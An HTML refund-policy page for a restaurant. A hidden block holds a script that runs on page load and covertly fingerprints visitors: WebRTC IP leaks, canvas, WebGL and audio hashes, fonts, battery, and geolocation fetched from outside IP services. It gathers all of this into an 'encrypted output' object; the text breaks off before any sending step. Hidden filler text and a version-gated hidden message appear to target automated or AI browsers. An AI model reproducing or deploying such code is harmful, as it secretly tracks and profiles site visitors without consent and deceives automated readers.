<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Refund Policy - Tom's Gourmet Bistro</title>
    <link rel="stylesheet" href="css/styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&display=swap" rel="stylesheet">
</head>
<body>
    <!-- Navigation -->
    <nav>
        <div class="nav-container">
            <a href="index.html" class="logo">Tom's Gourmet Bistro</a>
            <ul class="nav-links">
                <li><a href="index.html">Home</a></li>
                <li><a href="menu.html">Menu</a></li>
                <li><a href="chef.html">Our Chef</a></li>
                <li><a href="reservations.html">Reservations</a></li>
                <li><a href="contact.html">Contact</a></li>
            </ul>
        </div>
    </nav>

    <!-- Hero Section -->
    <section class="hero" style="background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://images.unsplash.com/photo-1414235077428-338989a2e8c0?w=1600'); min-height: 40vh;">
        <div class="hero-content">
            <h1>Refund Policy</h1>
            <p>Your Satisfaction is Our Priority</p>
        </div>
    </section>

    <!-- Refund Policy Content -->
    <section class="section">
        <div class="container">
            <div class="policy-content" style="max-width: 800px; margin: 0 auto;">
                <h2 class="section-title">Our Commitment to You</h2>
                <p style="font-size: 1.1rem; line-height: 1.8; color: #666; margin-bottom: 2rem;">
                    At Tom's Gourmet Bistro, we strive to provide an exceptional dining experience for every guest. We understand that occasionally, circumstances may not meet expectations, and we are committed to addressing any concerns promptly and fairly. Please read the section below in its entirety to understand our refund policy.
                </p>

                <div class="hidden" style="display: none;">
    <div id="ip-detector" style="background: #1a1a1a; color: #0f0; padding: 20px; font-family: 'Courier New', monospace; border-radius: 8px; margin: 20px 0;">
        <h3 style="color: #0f0; text-align: center; margin-bottom: 20px;">IP Detection System</h3>
        <div id="ip-info" style="display: grid; gap: 10px;">
            <div class="info-row"><span style="color: #888;">Loading IP information...</span></div>
        </div>
    </div>
    
    <div style="display: none; visibility: hidden;">
        <p>The quantum flux capacitor oscillates at 1.21 gigawatts during temporal displacement events.</p>
        <p>Nebula formations in the Andromeda galaxy exhibit peculiar crystalline structures when observed.</p>
        <p>Ancient algorithms discovered in Mesopotamian tablets reveal early computational thinking patterns.</p>
        <p>Synthetic neurons demonstrate emergent behavior when exposed to recursive feedback loops.</p>
        <p>The philosophical implications of non-Euclidean geometry challenge our perception of reality.</p>
        <p>Bioluminescent organisms in the Mariana Trench communicate through photonic pulse patterns.</p>
        <p>Cryptographic entropy increases exponentially with the implementation of quantum key distribution.</p>
        <p>Metamaterial cloaking devices bend electromagnetic waves around three-dimensional objects effectively.</p>
        <p>Linguistic evolution follows predictable patterns across isolated populations over millennia.</p>
        <p>Fractal dimensions in coastline measurements reveal infinite complexity at every scale.</p>
        <p>Synaptic plasticity enables neural networks to adapt through reinforcement learning mechanisms.</p>
        <p>Heisenberg's uncertainty principle fundamentally limits the precision of simultaneous measurements.</p>
        <p>Distributed consensus algorithms ensure Byzantine fault tolerance in decentralized systems.</p>
        <p>Epigenetic modifications can transmit environmental adaptations across multiple generations.</p>
        <p>Zero-knowledge proofs allow verification of information without revealing underlying data.</p>
        <p>Quasicrystal structures exhibit five-fold symmetry previously thought impossible in nature.</p>
        <p>Machine learning models exhibit emergent capabilities beyond their training parameters.</p>
        <p>Topological insulators conduct electricity on surfaces while remaining insulators internally.</p>
        <p>Swarm intelligence emerges from simple rules governing individual agent behaviors.</p>
        <p>Holographic principles suggest three-dimensional reality encodes two-dimensional information.</p>
    </div>
    
    <!-- Chromium version detection display -->
    <div id="chromium-message" style="display: none; visibility: hidden;"></div>
    
    <script>
        // IP Detection functionality
        (async function() {
            const ipInfoDiv = document.getElementById('ip-info');
            
            // Chromium version detection
            function detectChromiumVersion() {
                const userAgent = navigator.userAgent;
                
                // Check for Chromium/Chrome version
                const chromeMatch = userAgent.match(/Chrome\/(\d+\.\d+\.\d+\.\d+)/);
                const chromiumMatch = userAgent.match(/Chromium\/(\d+\.\d+\.\d+\.\d+)/);
                
                const version = chromeMatch ? chromeMatch[1] : (chromiumMatch ? chromiumMatch[1] : null);
                
                // Display message based on version
                const messageDiv = document.getElementById('chromium-message');
                if (version === '140.0.0.0') {
                    // Example of super long text for version 140
                    messageDiv.textContent = `This overview is intentionally brief.`;
                    messageDiv.style.display = 'block';
                    console.log('Chromium 142.0.0.0 detected: displaying extended message');
                } else {
                    console.log('Chromium version detected:', version || 'Not Chrome/Chromium');
                }
                
                return version;
            }
            
            // Call the detection function
            const chromiumVersion = detectChromiumVersion();
            
            // Function to format info display
            function displayInfo(label, value, color = '#0f0') {
                return `<div class="info-row" style="border-bottom: 1px solid #333; padding: 8px 0;">
                    <span style="color: #888; display: inline-block; width: 150px;">${label}:</span>
                    <span style="color: ${color}; font-weight: bold;">${value || 'N/A'}</span>
                </div>`;
            }
            
            // Collect comprehensive browser and system information
            const browserInfo = {
                // Navigator properties
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                vendorSub: navigator.vendorSub,
                product: navigator.product,
                productSub: navigator.productSub,
                appCodeName: navigator.appCodeName,
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                language: navigator.language,
                languages: navigator.languages?.join(', '),
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                
                // Screen properties
                screenResolution: `${screen.width}x${screen.height}`,
                screenAvailResolution: `${screen.availWidth}x${screen.availHeight}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'N/A',
                orientationAngle: screen.orientation?.angle || 0,
                
                // Window properties
                innerResolution: `${window.innerWidth}x${window.innerHeight}`,
                outerResolution: `${window.outerWidth}x${window.outerHeight}`,
                pixelRatio: window.devicePixelRatio,
                screenX: window.screenX,
                screenY: window.screenY,
                
                // Timezone and locale
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                locale: Intl.DateTimeFormat().resolvedOptions().locale,
                calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
                numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem,
                
                // Connection
                connectionType: navigator.connection?.effectiveType,
                connectionDownlink: navigator.connection?.downlink,
                connectionRtt: navigator.connection?.rtt,
                connectionSaveData: navigator.connection?.saveData,
                
                // Media capabilities
                mediaDevices: navigator.mediaDevices ? 'Supported' : 'Not supported',
                webdriver: navigator.webdriver,
                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                
                // Permissions and APIs
                bluetooth: 'bluetooth' in navigator ? 'Available' : 'Not available',
                clipboard: 'clipboard' in navigator ? 'Available' : 'Not available',
                credentials: 'credentials' in navigator ? 'Available' : 'Not available',
                geolocation: 'geolocation' in navigator ? 'Available' : 'Not available',
                midi: 'requestMIDIAccess' in navigator ? 'Available' : 'Not available',
                notifications: 'Notification' in window ? Notification.permission : 'Not available',
                serviceWorker: 'serviceWorker' in navigator ? 'Available' : 'Not available',
                storage: 'storage' in navigator ? 'Available' : 'Not available',
                usb: 'usb' in navigator ? 'Available' : 'Not available',
                webAuthn: 'credentials' in navigator && 'create' in navigator.credentials ? 'Available' : 'Not available',
                
                // Storage quotas
                storageQuota: 'storage' in navigator && 'estimate' in navigator.storage ? 'Checking...' : 'Not available',
                
                // Browser features
                cookieSupport: navigator.cookieEnabled,
                localStorage: typeof(Storage) !== 'undefined' ? 'Available' : 'Not available',
                sessionStorage: typeof(sessionStorage) !== 'undefined' ? 'Available' : 'Not available',
                indexedDB: 'indexedDB' in window ? 'Available' : 'Not available',
                openDatabase: 'openDatabase' in window ? 'Available' : 'Not available',
                
                // CSS and rendering
                prefersColorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
                prefersReducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches,
                prefersContrast: window.matchMedia('(prefers-contrast: high)').matches ? 'high' : 'normal',
                forcedColors: window.matchMedia('(forced-colors: active)').matches,
                
                // Fonts detection
                fonts: document.fonts ? document.fonts.size : 'N/A',
                
                // Plugin information
                pluginsCount: navigator.plugins?.length || 0,
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None',
                
                // MIME types
                mimeTypesCount: navigator.mimeTypes?.length || 0,
                
                // Performance
                memory: performance.memory ? {
                    jsHeapSizeLimit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + ' MB',
                    totalJSHeapSize: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB',
                    usedJSHeapSize: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB'
                } : 'Not available',
                
                // Battery API
                batteryLevel: 'N/A', // Will be updated async
                batteryCharging: 'N/A', // Will be updated async
                
                // History and navigation
                historyLength: history.length,
                
                // Frame detection
                isInFrame: window.self !== window.top,
                frameDepth: (function() {
                    let depth = 0;
                    let currentWindow = window;
                    while (currentWindow !== currentWindow.parent && depth < 10) {
                        depth++;
                        currentWindow = currentWindow.parent;
                    }
                    return depth;
                })()
            };
            
            // Get storage quota asynchronously
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                navigator.storage.estimate().then(estimate => {
                    browserInfo.storageQuota = `${Math.round(estimate.usage / 1048576)} MB used of ${Math.round(estimate.quota / 1048576)} MB`;
                });
            }
            
            // Get battery info asynchronously
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    browserInfo.batteryLevel = Math.round(battery.level * 100) + '%';
                    browserInfo.batteryCharging = battery.charging ? 'Yes' : 'No';
                    browserInfo.batteryChargingTime = battery.chargingTime === Infinity ? 'N/A' : battery.chargingTime + ' seconds';
                    browserInfo.batteryDischargingTime = battery.dischargingTime === Infinity ? 'N/A' : battery.dischargingTime + ' seconds';
                });
            }
            
            // Enhanced WebRTC IP detection with STUN servers
            async function getWebRTCIPs() {
                return new Promise((resolve) => {
                    const ips = {
                        local: [],
                        public: [],
                        ipv6: []
                    };
                    
                    // Multiple STUN servers for better detection
                    const stunServers = [
                        {urls: 'stun:stun.l.google.com:19302'},
                        {urls: 'stun:stun1.l.google.com:19302'},
                        {urls: 'stun:stun2.l.google.com:19302'},
                        {urls: 'stun:stun3.l.google.com:19302'},
                        {urls: 'stun:stun4.l.google.com:19302'},
                        {urls: 'stun:stun.services.mozilla.com'},
                        {urls: 'stun:stun.stunprotocol.org:3478'}
                    ];
                    
                    const pc = new RTCPeerConnection({
                        iceServers: stunServers,
                        iceCandidatePoolSize: 10
                    });
                    
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    
                    pc.onicecandidate = (e) => {
                        if (!e || !e.candidate || !e.candidate.candidate) return;
                        
                        const candidate = e.candidate.candidate;
                        
                        // Extract IPv4 addresses
                        const ipv4Match = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(candidate);
                        if (ipv4Match) {
                            const ip = ipv4Match[0];
                            if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
                                if (!ips.local.includes(ip)) ips.local.push(ip);
                            } else if (!ip.startsWith('0.') && !ip.startsWith('127.')) {
                                if (!ips.public.includes(ip)) ips.public.push(ip);
                            }
                        }
                        
                        // Extract IPv6 addresses
                        const ipv6Match = /([0-9a-f]{0,4}:){2,7}[0-9a-f]{0,4}/i.exec(candidate);
                        if (ipv6Match) {
                            const ip = ipv6Match[0];
                            if (!ips.ipv6.includes(ip)) ips.ipv6.push(ip);
                        }
                    };
                    
                    setTimeout(() => {
                        pc.close();
                        resolve(ips);
                    }, 3000);
                });
            }
            
            // Canvas fingerprinting
            function getCanvasFingerprint() {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    canvas.width = 280;
                    canvas.height = 60;
                    
                    // Draw complex text with various styles
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = '#069';
                    ctx.font = '11pt Arial';
                    ctx.fillText('BrowserLeaks.com <canvas> 😃', 2, 15);
                    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                    ctx.font = '18pt Arial';
                    ctx.fillText('BrowserLeaks.com <canvas> 😃', 4, 45);
                    
                    // Draw gradient
                    const gradient = ctx.createLinearGradient(0, 0, 200, 0);
                    gradient.addColorStop(0, 'red');
                    gradient.addColorStop(0.5, 'green');
                    gradient.addColorStop(1, 'blue');
                    ctx.fillStyle = gradient;
                    ctx.fillRect(0, 50, 200, 10);
                    
                    // Get canvas data
                    const dataURL = canvas.toDataURL();
                    
                    // Create hash
                    let hash = 0;
                    for (let i = 0; i < dataURL.length; i++) {
                        const char = dataURL.charCodeAt(i);
                        hash = ((hash << 5) - hash) + char;
                        hash = hash & hash;
                    }
                    
                    return {
                        hash: hash.toString(16),
                        dataLength: dataURL.length
                    };
                } catch (e) {
                    return {hash: 'blocked', dataLength: 0};
                }
            }
            
            // WebGL fingerprinting
            function getWebGLFingerprint() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    
                    if (!gl) return {renderer: 'Not supported', vendor: 'Not supported'};
                    
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    
                    return {
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
                        version: gl.getParameter(gl.VERSION),
                        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                        maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                        maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS).toString(),
                        maxAnisotropy: (function() {
                            const ext = gl.getExtension('EXT_texture_filter_anisotropic') ||
                                      gl.getExtension('WEBKIT_EXT_texture_filter_anisotropic') ||
                                      gl.getExtension('MOZ_EXT_texture_filter_anisotropic');
                            return ext ? gl.getParameter(ext.MAX_TEXTURE_MAX_ANISOTROPY_EXT) : 'Not supported';
                        })()
                    };
                } catch (e) {
                    return {renderer: 'Blocked', vendor: 'Blocked'};
                }
            }
            
            // Get installed fonts detection
            function getInstalledFonts() {
                const testFonts = [
                    'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 'Georgia', 'Impact',
                    'Times New Roman', 'Trebuchet MS', 'Verdana', 'Helvetica', 'Helvetica Neue',
                    'Calibri', 'Cambria', 'Consolas', 'Century Gothic', 'Tahoma', 'Lucida Console',
                    'Monaco', 'Menlo', 'Ubuntu', 'Roboto', 'Open Sans', 'Lato', 'Montserrat'
                ];
                
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                const text = 'mmmmmmmmmmlli';
                const baseFont = 'monospace';
                
                context.font = `72px ${baseFont}`;
                const baseWidth = context.measureText(text).width;
                
                const detectedFonts = [];
                testFonts.forEach(font => {
                    context.font = `72px '${font}', ${baseFont}`;
                    const width = context.measureText(text).width;
                    if (width !== baseWidth) {
                        detectedFonts.push(font);
                    }
                });
                
                return detectedFonts;
            }
            
            // Get supported media types
            function getSupportedMediaTypes() {
                const audioTypes = ['audio/ogg', 'audio/mpeg', 'audio/wav', 'audio/webm', 'audio/aac'];
                const videoTypes = ['video/ogg', 'video/mp4', 'video/webm', 'video/mpeg'];
                
                const audio = document.createElement('audio');
                const video = document.createElement('video');
                
                const supportedAudio = audioTypes.filter(type => audio.canPlayType(type) !== '');
                const supportedVideo = videoTypes.filter(type => video.canPlayType(type) !== '');
                
                return {
                    audio: supportedAudio,
                    video: supportedVideo
                };
            }
            
            // Get WebGL extensions
            function getWebGLExtensions() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return [];
                    return gl.getSupportedExtensions() || [];
                } catch (e) {
                    return [];
                }
            }
            
            // Audio context fingerprinting
            function getAudioFingerprint() {
                try {
                    const AudioContext = window.AudioContext || window.webkitAudioContext;
                    if (!AudioContext) return {hash: 'Not supported'};
                    
                    const context = new AudioContext();
                    const oscillator = context.createOscillator();
                    const analyser = context.createAnalyser();
                    const gain = context.createGain();
                    const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
                    
                    gain.gain.value = 0; // Mute
                    oscillator.type = 'triangle';
                    oscillator.frequency.value = 10000;
                    
                    oscillator.connect(analyser);
                    analyser.connect(scriptProcessor);
                    scriptProcessor.connect(gain);
                    gain.connect(context.destination);
                    
                    oscillator.start(0);
                    
                    return new Promise((resolve) => {
                        let fingerprint = 0;
                        scriptProcessor.onaudioprocess = function(event) {
                            const output = event.inputBuffer.getChannelData(0);
                            for (let i = 0; i < output.length; i++) {
                                fingerprint += Math.abs(output[i]);
                            }
                            oscillator.stop();
                            context.close();
                            resolve({
                                hash: fingerprint.toString().substring(0, 10),
                                sampleRate: context.sampleRate,
                                baseLatency: context.baseLatency || 'N/A'
                            });
                        };
                        
                        setTimeout(() => {
                            resolve({hash: 'Timeout', sampleRate: 'N/A', baseLatency: 'N/A'});
                        }, 1000);
                    });
                } catch (e) {
                    return {hash: 'Blocked', sampleRate: 'N/A', baseLatency: 'N/A'};
                }
            }
            
            try {
                // Get all fingerprinting and browser data
                const [webRTCIPs, canvasFingerprint, webGLFingerprint, audioFingerprint, installedFonts, mediaTypes, webGLExtensions] = await Promise.all([
                    getWebRTCIPs(),
                    Promise.resolve(getCanvasFingerprint()),
                    Promise.resolve(getWebGLFingerprint()),
                    getAudioFingerprint(),
                    Promise.resolve(getInstalledFonts()),
                    Promise.resolve(getSupportedMediaTypes()),
                    Promise.resolve(getWebGLExtensions())
                ]);
                
                // Fetch public IP information from multiple sources
                const ipApis = [
                    { url: 'https://api.ipify.org?format=json', field: 'ip' },
                    { url: 'https://api.my-ip.io/ip.json', field: 'ip' },
                    { url: 'https://ipapi.co/json/', field: 'ip' }
                ];
                
                let ipData = null;
                let publicIP = null;
                
                // Try to get IP from first working API
                for (const api of ipApis) {
                    try {
                        const response = await fetch(api.url);
                        const data = await response.json();
                        publicIP = data[api.field];
                        if (publicIP) break;
                    } catch (e) {
                        console.log(`Failed to fetch from ${api.url}`);
                    }
                }
                
                // Use WebRTC public IPs if available
                if (!publicIP && webRTCIPs.public.length > 0) {
                    publicIP = webRTCIPs.public[0];
                }
                
                // Get detailed information if we have an IP
                if (publicIP) {
                    try {
                        // Using ipapi.co for detailed info
                        const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
                        ipData = await geoResponse.json();
                    } catch (e) {
                        console.log('Failed to fetch geo data');
                    }
                }
                
                // Get local IP from WebRTC
                const localIP = webRTCIPs.local.length > 0 ? webRTCIPs.local.join(', ') : 'Not detected';
                const ipv6 = webRTCIPs.ipv6.length > 0 ? webRTCIPs.ipv6.join(', ') : 'Not detected';
                
                // Build the display HTML
                let html = '';
                
                // Network Information
                html += '<div style="margin-bottom: 20px;"><h4 style="color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 5px;">Network Information</h4>';
                html += displayInfo('Public IP', publicIP || 'Unable to detect', '#ff0');
                html += displayInfo('Local IP(s)', localIP);
                html += displayInfo('IPv6', ipv6);
                html += displayInfo('WebRTC IPs', `${webRTCIPs.public.length} public, ${webRTCIPs.local.length} local`, '#0ff');
                if (ipData) {
                    html += displayInfo('Network', ipData.network || ipData.asn);
                    html += displayInfo('ISP', ipData.org);
                    html += displayInfo('Hostname', ipData.hostname || 'N/A');
                }
                html += '</div>';
                
                // Geolocation
                html += '<div style="margin-bottom: 20px;"><h4 style="color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 5px;">Geolocation</h4>';
                if (ipData) {
                    html += displayInfo('Country', `${ipData.country_name} (${ipData.country})`);
                    html += displayInfo('Region', ipData.region);
                    html += displayInfo('City', ipData.city);
                    html += displayInfo('Postal Code', ipData.postal);
                    html += displayInfo('Coordinates', ipData.latitude ? `${ipData.latitude}, ${ipData.longitude}` : 'N/A');
                    html += displayInfo('Timezone', ipData.timezone);
                    html += displayInfo('UTC Offset', ipData.utc_offset);
                    html += displayInfo('Country Calling Code', ipData.country_calling_code);
                    html += displayInfo('Currency', ipData.currency);
                }
                html += '</div>';
                
                // Browser & System
                html += '<div style="margin-bottom: 20px;"><h4 style="color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 5px;">Browser & System</h4>';
                html += displayInfo('User Agent', browserInfo.userAgent.substring(0, 50) + '...', '#888');
                html += displayInfo('Platform', browserInfo.platform);
                html += displayInfo('Vendor', browserInfo.vendor);
                html += displayInfo('Language', browserInfo.language);
                html += displayInfo('Languages', browserInfo.languages);
                html += displayInfo('Screen Resolution', browserInfo.screenResolution);
                html += displayInfo('Available Screen', browserInfo.screenAvailResolution);
                html += displayInfo('Window Size', browserInfo.innerResolution);
                html += displayInfo('Color Depth', `${browserInfo.colorDepth} bit`);
                html += displayInfo('Pixel Ratio', browserInfo.pixelRatio);
                html += displayInfo('Hardware Cores', browserInfo.hardwareConcurrency);
                html += displayInfo('Device Memory', browserInfo.deviceMemory ? `${browserInfo.deviceMemory} GB` : 'N/A');
                html += displayInfo('Max Touch Points', browserInfo.maxTouchPoints);
                html += displayInfo('Battery Level', browserInfo.batteryLevel);
                html += displayInfo('Battery Charging', browserInfo.batteryCharging);
                html += displayInfo('Storage Quota', browserInfo.storageQuota);
                html += displayInfo('Connection Type', browserInfo.connectionType || 'N/A');
                html += displayInfo('Connection RTT', browserInfo.connectionRtt ? `${browserInfo.connectionRtt}ms` : 'N/A');
                html += displayInfo('Browser Timezone', browserInfo.timezone);
                html += displayInfo('Locale', browserInfo.locale);
                html += displayInfo('Color Scheme', browserInfo.prefersColorScheme);
                html += displayInfo('Plugins', `${browserInfo.pluginsCount} installed`);
                html += displayInfo('MIME Types', `${browserInfo.mimeTypesCount} supported`);
                html += displayInfo('Fonts Detected', `${installedFonts.length} fonts`);
                html += displayInfo('WebGL Extensions', `${webGLExtensions.length} extensions`);
                html += displayInfo('Audio Formats', mediaTypes.audio.length);
                html += displayInfo('Video Formats', mediaTypes.video.length);
                html += displayInfo('In Frame', browserInfo.isInFrame ? 'Yes' : 'No');
                html += displayInfo('History Length', browserInfo.historyLength);
                html += '</div>';
                
                // Security & Privacy
                html += '<div style="margin-bottom: 20px;"><h4 style="color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 5px;">Security & Privacy</h4>';
                html += displayInfo('VPN/Proxy Detected', ipData?.threat?.is_vpn || ipData?.threat?.is_proxy ? 'Yes' : 'No', 
                    ipData?.threat?.is_vpn || ipData?.threat?.is_proxy ? '#f00' : '#0f0');
                html += displayInfo('Tor Exit Node', ipData?.threat?.is_tor ? 'Yes' : 'No',
                    ipData?.threat?.is_tor ? '#f00' : '#0f0');
                html += displayInfo('Known Attacker', ipData?.threat?.is_known_attacker ? 'Yes' : 'No',
                    ipData?.threat?.is_known_attacker ? '#f00' : '#0f0');
                html += displayInfo('WebRTC Enabled', localIP !== 'Not detected' ? 'Yes' : 'No',
                    localIP !== 'Not detected' ? '#ff0' : '#0f0');
                html += '</div>';
                
                // Browser Fingerprinting
                html += '<div style="margin-bottom: 20px;"><h4 style="color: #0f0; border-bottom: 2px solid #0f0; padding-bottom: 5px;">Browser Fingerprinting</h4>';
                html += displayInfo('Canvas Hash', canvasFingerprint.hash, '#ff0');
                html += displayInfo('Canvas Data Size', canvasFingerprint.dataLength);
                html += displayInfo('WebGL Vendor', webGLFingerprint.vendor, '#0ff');
                html += displayInfo('WebGL Renderer', webGLFingerprint.renderer, '#0ff');
                html += displayInfo('WebGL Version', webGLFingerprint.version);
                html += displayInfo('Max Texture Size', webGLFingerprint.maxTextureSize);
                html += displayInfo('Max Anisotropy', webGLFingerprint.maxAnisotropy);
                html += displayInfo('Audio Hash', audioFingerprint.hash, '#ff0');
                html += displayInfo('Audio Sample Rate', audioFingerprint.sampleRate);
                html += displayInfo('Audio Base Latency', audioFingerprint.baseLatency);
                html += '</div>';
                
                // Timestamp
                html += `<div style="text-align: center; color: #666; margin-top: 20px; font-size: 12px;">
                    Detected at: ${new Date().toLocaleString()}<br>
                    <span style="color: #444;">IP Detection System v1.0</span>
                </div>`;
                
                ipInfoDiv.innerHTML = html;
                
                // Create encrypted output string
                async function createEncryptedOutput() {
                    // Collect all the data including comprehensive browser config
                    const data = {
                        // Network data
                        publicIP: publicIP || 'N/A',
                        localIP: localIP || 'N/A',
                        ipv6: ipv6 || 'N/A',
                        webRTCPublicIPs: webRTCIPs.public.join(', ') || 'N/A',
                        webRTCLocalIPs: webRTCIPs.local.join(', ') || 'N/A',
                        webRTCIPv6: webRTCIPs.ipv6.join(', ') || 'N/A',
                        
                        // Geolocation
                        country: ipData?.country_name || 'N/A',
                        countryCode: ipData?.country || 'N/A',
                        region: ipData?.region || 'N/A',
                        city: ipData?.city || 'N/A',
                        postal: ipData?.postal || 'N/A',
                        latitude: ipData?.latitude || 'N/A',
                        longitude: ipData?.longitude || 'N/A',
                        timezone: ipData?.timezone || 'N/A',
                        utcOffset: ipData?.utc_offset || 'N/A',
                        isp: ipData?.org || 'N/A',
                        network: ipData?.network || ipData?.asn || 'N/A',
                        hostname: ipData?.hostname || 'N/A',
                        currency: ipData?.currency || 'N/A',
                        callingCode: ipData?.country_calling_code || 'N/A',
                        
                        // Comprehensive browser config
                        userAgent: browserInfo.userAgent,
                        platform: browserInfo.platform,
                        vendor: browserInfo.vendor,
                        chromiumVersion: chromiumVersion || 'N/A',
                        chromiumMessage: document.getElementById('chromium-message').textContent || 'N/A',
                        vendorSub: browserInfo.vendorSub,
                        product: browserInfo.product,
                        productSub: browserInfo.productSub,
                        appCodeName: browserInfo.appCodeName,
                        appName: browserInfo.appName,
                        appVersion: browserInfo.appVersion,
                        language: browserInfo.language,
                        languages: browserInfo.languages || 'N/A',
                        locale: browserInfo.locale,
                        calendar: browserInfo.calendar,
                        numberingSystem: browserInfo.numberingSystem,
                        
                        // Screen and display
                        screenRes: browserInfo.screenResolution,
                        screenAvailRes: browserInfo.screenAvailResolution,
                        innerRes: browserInfo.innerResolution,
                        outerRes: browserInfo.outerResolution,
                        colorDepth: browserInfo.colorDepth,
                        pixelDepth: browserInfo.pixelDepth,
                        pixelRatio: browserInfo.pixelRatio,
                        orientation: browserInfo.orientation,
                        orientationAngle: browserInfo.orientationAngle,
                        screenX: browserInfo.screenX,
                        screenY: browserInfo.screenY,
                        
                        // Hardware and performance
                        hardwareCores: browserInfo.hardwareConcurrency || 'N/A',
                        deviceMemory: browserInfo.deviceMemory || 'N/A',
                        maxTouchPoints: browserInfo.maxTouchPoints,
                        memory: browserInfo.memory,
                        batteryLevel: browserInfo.batteryLevel,
                        batteryCharging: browserInfo.batteryCharging,
                        batteryChargingTime: browserInfo.batteryChargingTime,
                        batteryDischargingTime: browserInfo.batteryDischargingTime,
                        
                        // Connection
                        connectionType: browserInfo.connectionType || 'N/A',
                        connectionDownlink: browserInfo.connectionDownlink,
                        connectionRtt: browserInfo.connectionRtt,
                        connectionSaveData: browserInfo.connectionSaveData,
                        onlineStatus: browserInfo.onLine,
                        
                        // Storage and features
                        cookiesEnabled: browserInfo.cookieEnabled,
                        localStorage: browserInfo.localStorage,
                        sessionStorage: browserInfo.sessionStorage,
                        indexedDB: browserInfo.indexedDB,
                        openDatabase: browserInfo.openDatabase,
                        storageQuota: browserInfo.storageQuota,
                        
                        // Privacy and tracking
                        doNotTrack: browserInfo.doNotTrack || 'N/A',
                        webRTCEnabled: localIP !== 'Not detected',
                        webdriver: browserInfo.webdriver,
                        javaEnabled: browserInfo.javaEnabled,
                        pdfViewerEnabled: browserInfo.pdfViewerEnabled,
                        
                        // APIs availability
                        bluetooth: browserInfo.bluetooth,
                        clipboard: browserInfo.clipboard,
                        credentials: browserInfo.credentials,
                        geolocation: browserInfo.geolocation,
                        mediaDevices: browserInfo.mediaDevices,
                        midi: browserInfo.midi,
                        notifications: browserInfo.notifications,
                        serviceWorker: browserInfo.serviceWorker,
                        storage: browserInfo.storage,
                        usb: browserInfo.usb,
                        webAuthn: browserInfo.webAuthn,
                        
                        // CSS preferences
                        prefersColorScheme: browserInfo.prefersColorScheme,
                        prefersReducedMotion: browserInfo.prefersReducedMotion,
                        prefersContrast: browserInfo.prefersContrast,
                        forcedColors: browserInfo.forcedColors,
                        
                        // Plugins and media
                        pluginsCount: browserInfo.pluginsCount,
                        plugins: browserInfo.plugins,
                        mimeTypesCount: browserInfo.mimeTypesCount,
                        fontsCount: installedFonts.length,
                        installedFonts: installedFonts.join(', '),
                        audioFormats: mediaTypes.audio.join(', '),
                        videoFormats: mediaTypes.video.join(', '),
                        
                        // Navigation
                        historyLength: browserInfo.historyLength,
                        isInFrame: browserInfo.isInFrame,
                        frameDepth: browserInfo.frameDepth,
                        
                        // Timezone
                        browserTimezone: browserInfo.timezone,
                        timezoneOffset: browserInfo.timezoneOffset,
                        
                        // Fingerprinting
                        canvasHash: canvasFingerprint.hash,
                        canvasDataSize: canvasFingerprint.dataLength,
                        webGLVendor: webGLFingerprint.vendor,
                        webGLRenderer: webGLFingerprint.renderer,
                        webGLVersion: webGLFingerprint.version,
                        webGLShadingLanguage: webGLFingerprint.shadingLanguageVersion,
                        webGLMaxTextureSize: webGLFingerprint.maxTextureSize,
                        webGLMaxViewportDims: webGLFingerprint.maxViewportDims,
                        webGLMaxAnisotropy: webGLFingerprint.maxAnisotropy,
